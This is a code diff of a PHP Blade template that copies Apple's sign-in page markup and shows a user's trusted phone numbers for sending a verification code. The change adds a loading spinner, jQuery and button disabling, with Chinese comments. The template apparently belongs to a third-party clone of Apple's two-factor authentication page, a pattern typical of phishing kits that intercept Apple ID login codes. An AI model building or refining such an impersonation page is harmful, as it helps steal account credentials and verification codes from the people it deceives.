@@ -8,7 +8,14 @@
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/auth.css') }}">
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/phone-list.css') }}">
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
-    <style type="text/css"></style>
+    <style>
+
+        .loading-gif {
+            display: none;
+            width: 25px;
+            height: 25px;
+        }
+    </style>
     <style data-id="immersive-translate-input-injected-css">
         .tk-callout {
             font-size: 24px;
@@ -17,6 +24,7 @@
             letter-spacing: .009em;
             font-family: SF Pro Display, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
         }
+
     </style>
 </head>
 
@@ -55,27 +63,36 @@
                                                         style="list-style: none;">
 
                                                         @foreach($trustedPhoneNumbers as $phone)
-                                                            <li class="ax-outline no-gutter si-device-row ">
+                                                            <li class="ax-outline no-gutter si-device-row">
+
                                                                 <button class="si-device-row"
                                                                         aria-describedby="deviceInfo2"
-                                                                        style="width: 100%; outline: none; display: block;"
-                                                                        onclick="sendCode('{{ $phone->id }}','{{$phone->numberWithDialCode}}')">
-                                                                    <div class="si-pointer">
+                                                                        style="width: 100%;
+                                                                        outline: none;
+                                                                        display: block;"
+                                                                        onclick="sendCode('{{ $phone->id }}','{{$phone->numberWithDialCode}}', this)">
+
+                                                                    <div class="si-pointer"
+                                                                         style="display: flex; align-items: center; justify-content: space-between;">
                                                                         <div class="large-11 small-11 si-device-desc"
                                                                              style="padding-left: 15px;">
                                                                             <div aria-hidden="true"
-                                                                                 class="si-device-name force-ltr">{{ $phone->numberWithDialCode }}
+                                                                                 class="si-device-name force-ltr">
+                                                                                {{ $phone->numberWithDialCode }}
                                                                             </div>
-                                                                            <div
-                                                                                class="si-device-meta tk-subbody">{{ __('apple.auth_phone_list.phone_type') }}
+                                                                            <div class="si-device-meta tk-subbody">
+                                                                                {{ __('apple.auth_phone_list.phone_type') }}
                                                                             </div>
                                                                         </div>
                                                                         <div class="large-1 small-1">
                                                                             <div class="img arrow">
                                                                                 <i class="shared-icon icon_right_chevron"></i>
                                                                             </div>
+
+                                                                            <img
+                                                                                src="{{ asset('/images/loading.gif') }}"
+                                                                                class="loading-gif" alt="Loading...">
                                                                         </div>
-                                                                        <span class="sr-only" id="deviceInfo2">number ending with 24</span>
                                                                     </div>
                                                                     <div class="si-focus-outline"></div>
                                                                 </button>
@@ -122,6 +139,7 @@
     </apple-auth>
 </div>
 <script type="text/javascript" src="{{ asset('/js/apple/fetch.js') }}"></script>
+<script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
 <script >
 
     const date = new Date();
@@ -130,7 +148,17 @@
     const phoneCount = {{ $trustedPhoneNumbers->count() }};
     document.cookie = `phoneCount=${phoneCount}; expires=${date}`;
 
-    function sendCode (id,phone){
+    function sendCode(id, phone, button) {
+        // 隐藏箭头图标
+        const arrow = button.querySelector('.arrow');
+        arrow.style.display = 'none';
+
+        // 显示loading gif
+        const loadingGif = button.querySelector('.loading-gif');
+        loadingGif.style.display = 'inline-block';
+
+        // 禁用按钮防止重复点击
+        button.disabled = true;
 
         const Guid = getGrid('Guid');
         if (Guid === null) {
